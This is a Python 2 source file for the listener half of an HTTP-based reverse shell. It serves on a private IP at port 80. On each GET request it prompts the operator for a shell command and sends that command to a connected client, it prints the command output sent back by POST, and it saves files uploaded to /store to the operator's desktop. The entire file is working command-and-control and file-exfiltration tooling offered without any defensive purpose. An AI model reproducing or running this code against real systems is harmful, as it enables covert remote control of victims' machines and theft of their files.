import BaseHTTPServer
import os
import cgi


HOST_NAME = '192.168.233.128'
PORT_NUMBER = 80

class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):

        command = raw_input("Shell > ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)

    def do_POST(s):

        if s.path == '/store':
            try:
                ctype, stuff = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage( fp = s.rfile,
                                           headers = s.headers,
                                           environ={'REQUEST_METHOD':'POST'}
                                           )
                else:
                    print '[-] Unexpected POST request'
                fs_up = fs['file']
                with open('/root/Desktop/filer', 'wb') as o:
                    o.write( fs_up.file.read())
                    o.close()
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print e
                return
                                           
                
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print postVar


if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), ServerHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[-] Server terminated'
        httpd.server_close()
